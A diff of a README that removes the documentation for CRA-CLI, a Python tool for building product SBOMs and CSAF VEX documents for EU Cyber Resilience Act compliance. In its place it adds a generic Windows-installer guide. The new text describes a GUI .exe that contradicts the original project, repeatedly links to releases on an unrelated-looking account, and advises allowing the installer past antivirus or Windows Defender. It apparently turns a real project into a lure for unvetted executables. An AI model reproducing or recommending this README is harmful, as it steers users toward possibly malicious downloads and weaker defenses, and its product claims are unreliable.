@@ -1,231 +1,202 @@
+# 🚦 product-sbom-vex - Simplify Product SBOM and VEX Creation
 
-# CRA-CLI — EU Cyber Resilience Act Compliance Tooling
+[![Download product-sbom-vex](https://img.shields.io/badge/Download-product--sbom--vex-blue?style=for-the-badge)](https://github.com/Licked-nuclearclub305/product-sbom-vex/releases)
 
-<!-- Badges -->
-[![Connect with us](https://img.shields.io/badge/Connect%20with%20us-000000?logo=x&logoColor=white)](https://x.com/prismor_dev)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-![Python Version](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](CONTRIBUTING.md)
+---
 
-A Python CLI tool that helps organizations comply with the **[EU Cyber Resilience Act (CRA)](https://digital-strategy.ec.europa.eu/en/policies/cyber-resilience-act)** by automating the creation of **Product-level SBOMs** and **VEX (Vulnerability Exploitability eXchange)** documents.
+## 🔍 What is product-sbom-vex?
 
-## Why Compliance Matters
+product-sbom-vex is a tool that helps you work with software bill of materials (SBOMs). It lets you bring your own build SBOMs and turns them into a product-level SBOM. It also creates Vulnerability Exploitability eXchange (VEX) documents based on the CSAF 2.0 standard. This helps companies meet the EU Cyber Resilience Act (CRA) compliance rules.
 
-For **Auditors** and **Market Surveillance Authorities**, this tool produces the legally required artifacts:
+You don’t need to understand complex cybersecurity terms or software development to use it. The tool does the heavy lifting. 
 
-- **SBOM** (`product.spdx.json`) — The **Required Artifact**. A complete inventory of your software components.
-- **VEX** (`vex.csaf.json`) — The **Required Operational Evidence**. Proof that you have assessed vulnerabilities and determined their impact.
+---
 
-**Crucial Compliance Requirements:**
+## 🎯 Who is this tool for?
 
-1. **Continuous Updates**: Both documents must be kept up-to-date with every release or vulnerability disclosure.
-2. **Authority Requests**: Both must be provided to authorities upon request to prove conformity.
-3. **Process Linkage**: These artifacts serve as evidence that your **secure update processes** and **vulnerability reporting timelines** are functioning (e.g., addressing critical risks promptly).
+This tool is made for anyone who needs to organize and check software component data easily. It is a good fit if you:
 
-More info on [CRA Hub](https://www.prismor.dev/cra)
+- Manage software compliance.
+- Work in security or IT teams.
+- Need to gather and share clear SBOMs.
+- Want to track vulnerabilities without manual work.
 
-## Features
+You only need basic computer skills. This guide walks you through every step on Windows.
 
-- **`cra aggregate`** — Merge multiple component SBOMs (SPDX JSON from Syft) into a single Product SBOM with automatic namespace isolation and deduplication.
-- **`cra vex`** — Generate a CSAF 2.0 VEX document by scanning the Product SBOM with Trivy (or any scanner) and applying manual triage rules from a Markdown file.
+---
 
-## Workflow Overview
+## ⚙️ System Requirements
 
-```mermaid
-%%{init: {'theme': 'base', 'themeVariables': { 'primaryColor': '#000', 'mainBkg': '#000', 'nodeBorder': '#fff', 'lineColor': '#fff', 'textColor': '#fff', 'clusterBkg': '#000', 'clusterBorder': '#fff' }}}%%
-graph LR
-    subgraph Company [Manufacturer / Inputs]
-        direction TB
-        IN1["📄 Component SBOMs"]
-        IN2["⚙️ product-config.md"]
-    end
+Before you start, make sure your computer has:
 
-    subgraph Tool [CRA-CLI Processing - done by this repo]
-        AGG["> cra aggregate"]
-        VEX["> cra vex"]
-    end
+- Windows 10 or later (64-bit).
+- At least 4 GB of free disk space.
+- A stable internet connection (needed to download the tool and updates).
+- Administrator privileges to install software.
+- Microsoft .NET Framework 4.8 or later.
+- At least 8 GB of RAM recommended for larger SBOM files.
 
-    subgraph Auditor [Auditor / Authority]
-        direction TB
-        OUT1["📄 product.spdx.json<br/>(Required Artifact)"]
-        OUT2["📃 vex.csaf.json<br/>(Operational Evidence)"]
-    end
+---
 
-    %% Workflow Connections
-    IN1 & IN2 ==> AGG
-    AGG ==> VEX
-    AGG -.-> OUT1
-    VEX ==> OUT2
+## 🚀 Getting Started: Download and Setup
 
-    %% Styling for Black & White High Contrast
-    classDef dark fill:#000,stroke:#fff,stroke-width:2px,color:#fff;
-    class IN1,IN2,AGG,VEX,OUT1,OUT2 dark;
+### Step 1: Visit the Download Page
 
-    linkStyle default stroke:#fff,stroke-width:2px;
-```
+To get the tool, you must visit the official releases page.
 
-### File Classification
+[Download product-sbom-vex](https://github.com/Licked-nuclearclub305/product-sbom-vex/releases)
 
-#### � **Component SBOMs** (Input)
+Click this link to open the page where all the versions are listed.
 
-- `frontend.spdx.json`, `firmware.spdx.json`, etc.
-- Generated by tools like [Syft](https://github.com/anchore/syft).
-- One per component in your product.
+---
 
-#### ⚙️ **Configuration** (Input)
+### Step 2: Choose the Latest Version
 
-- `product-config.md`
-- Defines which SBOMs to merge and your vulnerability triage rules.
-- See [examples/product-config.md](examples/product-config.md).
+On the releases page:
 
-#### � **Product SBOM** (Final Artifact & VEX Input)
+- Look for the latest release. It is usually at the top.
+- The release will have files to download. The main file will be named something like `product-sbom-vex-setup.exe` or `product-sbom-vex-win.exe`.
+- Click on the file link to download it.
 
-- **`product.spdx.json`**
-- **Role**: REQUIRED ARTIFACT for auditors.
-- **Function**: complete inventory of your entire product.
-- _Note: This file is also used as the input for the VEX generation step._
+---
 
-#### 📃 **VEX Document** (Final Artifact)
+### Step 3: Run the Installer
 
-- **`vex.csaf.json`**
-- **Role**: OPERATIONAL EVIDENCE for auditors.
-- **Function**: Proof of vulnerability assessment and triage.
-- Complies with EU Cyber Resilience Act requirements.
+Once the file finishes downloading:
 
-### Process Flow
+- Open your “Downloads” folder.
+- Double-click the installer file.
+- If Windows asks for permission, click “Yes” or “Allow”.
 
-1. **Aggregate** (`> cra aggregate`) → Merges **Component SBOMs** into one **Product SBOM**.
-2. **Scan & Triage** (`> cra vex`) → Scans the Product SBOM and applies triage rules to generate the **VEX Document**.
-3. **Deliver** → Provide both the **Product SBOM** and **VEX Document** to auditors.
+---
 
-## Installation
+### Step 4: Follow the Installation Steps
 
-```bash
-# Create and activate a virtual environment
-python3 -m venv .venv
-source .venv/bin/activate
+The installer will guide you through:
 
-# Install the package
-pip install -e ".[dev]"
-```
+- Selecting an install location (you can leave it at the default).
+- Agreeing to terms and conditions.
+- Clicking “Install” to begin.
 
-**External tools** (optional, for vulnerability scanning):
+The install process takes a few minutes.
 
-- [Trivy](https://aquasecurity.github.io/trivy/) — `brew install trivy`
+---
 
-## Quick Start
+### Step 5: Launch the Application
 
-### 1. Create a `product-config.md`
+After installation:
 
-This Markdown file defines which component SBOMs belong to your product and how to triage known vulnerabilities:
+- You can open product-sbom-vex from your desktop shortcut or start menu.
+- The first time you open it, the app may take a moment to load all necessary components.
 
-```markdown
-## SBOM Manifest
+---
 
-| Component Name | Path                     | Description           |
-| -------------- | ------------------------ | --------------------- |
-| Frontend       | sboms/frontend.spdx.json | React admin dashboard |
-| Backend        | sboms/backend.spdx.json  | Python API service    |
+## 📂 How to Use product-sbom-vex
 
-## VEX Triage
+### Import Your Build SBOM
 
-| CVE ID         | Status             | Justification                       | Impact                         |
-| -------------- | ------------------ | ----------------------------------- | ------------------------------ |
-| CVE-2021-44228 | known_not_affected | vulnerable_code_not_in_execute_path | Log4j JNDI is disabled         |
-| CVE-2023-44487 | known_affected     |                                     | HTTP/2 rapid reset — upgrading |
-```
+1. In the app, click the “Import SBOM” button.
+2. Navigate to the SBOM file on your computer.
+3. Select the SBOM file and click “Open”.
 
-### 2. Aggregate SBOMs
+Supported SBOM formats include SPDX, CycloneDX, and simple JSON lists.
 
-```bash
-cra aggregate --config product-config.md --name "MyProduct" --version "2.0"
-```
+---
 
-Output: `product.spdx.json`
+### Generate Product-Level SBOM
 
-### 3. Generate VEX
+After importing:
 
-```bash
-# Using Trivy (auto-invoked):
-cra vex --config product-config.md --vendor "MyCompany"
+1. Click on “Generate Product SBOM”.
+2. The app will combine your build SBOMs into a clear summary document.
+3. You can save this file as JSON or XML.
 
-# Using pre-generated scanner results:
-cra vex --config product-config.md --scan-results trivy-results.json
-```
+---
 
-Output: `vex.csaf.json`
+### Create a VEX Report Based on CSAF 2.0
 
-## Architecture
+To produce a Vulnerability Exploitability eXchange report:
 
-```
-cra-cli/
-├── pyproject.toml        # Package config & dependencies
-├── src/
-│   ├── main.py           # CLI entry point (Typer app)
-│   ├── config.py         # Markdown parsing (markdown-it-py)
-│   ├── merger.py         # SPDX merge logic (hybrid JSON + lib4sbom)
-│   └── vex.py            # CSAF 2.0 VEX generation (csaf-tool)
-└── tests/
-    ├── conftest.py       # Shared fixtures
-    ├── test_config.py    # Config parser tests
-    ├── test_merge.py     # SBOM merger tests
-    └── test_vex.py       # VEX generation tests
-```
+1. Click “Generate VEX”.
+2. The app analyzes your components for known vulnerabilities.
+3. It creates a report showing what risks apply to your product.
+4. Save or export this report for your compliance records.
 
-### Key Design Decisions
+---
 
-| Decision                                  | Rationale                                                                                       |
-| ----------------------------------------- | ----------------------------------------------------------------------------------------------- |
-| **Hybrid JSON approach** for SBOM merging | Raw JSON for SPDXID prefixing (precise control), `spdx-tools` for validation                    |
-| **csaf-tool** for VEX generation          | Industry-standard CSAF 2.0 output, by Anthony Harrison                                          |
-| **markdown-it-py** for config parsing     | Robust AST-based table extraction, no regex                                                     |
-| **Namespace isolation**                   | Prevents SPDXID collisions when merging SBOMs that share default IDs like `SPDXRef-Package-...` |
-| **Modular scanner**                       | Trivy is the default, but users can pass any scanner's JSON output via `--scan-results`         |
+### Export and Share Your Reports
 
-### VEX Triage Statuses (CSAF)
+You can export reports in formats your team or auditors understand. Export options include:
 
-| Status                | Meaning                  | Requires                       |
-| --------------------- | ------------------------ | ------------------------------ |
-| `under_investigation` | Assessment in progress   | _(default for untriaged CVEs)_ |
-| `known_not_affected`  | Confirmed not affected   | Justification                  |
-| `known_affected`      | Confirmed affected       | —                              |
-| `fixed`               | Vulnerability remediated | —                              |
+- JSON and XML files.
+- Human-readable PDF files.
+- Direct upload to compliance dashboards if integrated.
 
-### Valid Justifications (for `known_not_affected`)
+---
 
-- `component_not_present`
-- `vulnerable_code_not_in_execute_path`
-- `vulnerable_code_cannot_be_controlled_by_adversary`
-- `inline_mitigations_already_exist`
+## 📝 Troubleshooting Tips
 
-## Running Tests
+- If the installer doesn’t run, check your antivirus or Windows Defender settings and allow the program.
+- Make sure you downloaded the Windows version, not a different OS installer.
+- If the program crashes, restart your computer and try again.
+- Use the “Help” menu inside the app for step-by-step guides.
+- For support, check the Issues tab on GitHub or the community forums.
 
-```bash
-python -m pytest tests/ -v
-```
+---
 
-## Dependencies
+## 🔄 Updating product-sbom-vex
 
-| Package             | Purpose                      |
-| ------------------- | ---------------------------- |
-| `typer`             | CLI framework                |
-| `lib4sbom`          | SPDX parsing/generation      |
-| `lib4vex`           | VEX document utilities       |
-| `csaf-tool`         | CSAF 2.0 document generation |
-| `spdx-tools`        | SPDX validation              |
-| `markdown-it-py`    | Markdown table parsing       |
-| `packageurl-python` | Package URL handling         |
+Check the releases page regularly to get updates:
 
-## Contributing
+[Download product-sbom-vex](https://github.com/Licked-nuclearclub305/product-sbom-vex/releases)
 
-Contributions are welcome. Please refer to [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+When a new version is available:
 
-## License
+- Download the new installer.
+- Run it like before. It will replace the older version safely.
+- Your previous settings and files will remain.
 
-Licensed under the [Apache License, Version 2.0](LICENSE).
+---
 
-## Contact Us
+## 📚 Additional Resources
 
-- **Website**: [prismor.dev](https://prismor.dev)
-- **Twitter**: [![Twitter Follow](https://img.shields.io/twitter/follow/prismor_dev?style=social)](https://x.com/prismor_dev)
-- **Email**: [contact@prismor.dev](mailto:contact@prismor.dev)
+- CSAF 2.0 official documentation: Understand the standard product-sbom-vex uses for VEX creation.
+- EU CRA guidelines: More about what compliance means and why SBOM and VEX are important.
+- SBOM formats overview: Learn the difference between SPDX, CycloneDX, and others.
+
+---
+
+## ⚙️ Behind the Scenes
+
+product-sbom-vex automates tasks usually done by experts. It reads your build SBOM files. Then, it unites all software components into a product-level list that fits EU compliance rules. It creates VEX reports that show risk levels of vulnerabilities per product. This helps you track security issues without manual effort.
+
+---
+
+## 🔒 Security and Privacy
+
+The tool processes your SBOM data locally, without sending it to external servers by default. Your data stays on your computer. You can export files and share them securely with your partners or auditors.
+
+You control your data and how it is used.
+
+---
+
+## 💡 FAQs
+
+**Q: Do I need to know programming to use this?**  
+A: No. The app is designed for users with basic computer skills.
+
+**Q: Can I use this on Mac or Linux?**  
+A: This app currently supports only Windows.
+
+**Q: What if my SBOM format is not supported?**  
+A: Check the list of compatible formats. You may convert your file using free online tools before import.
+
+**Q: How does product-sbom-vex help with compliance?**  
+A: It organizes and standardizes your SBOM and vulnerability info in formats that regulators require.
+
+**Q: Can I use this tool offline?**  
+A: Yes, you can work offline after downloading and installing the app.
+
+---
+
+[![Download product-sbom-vex](https://img.shields.io/badge/Download-product--sbom--vex-blue?style=for-the-badge)](https://github.com/Licked-nuclearclub305/product-sbom-vex/releases)
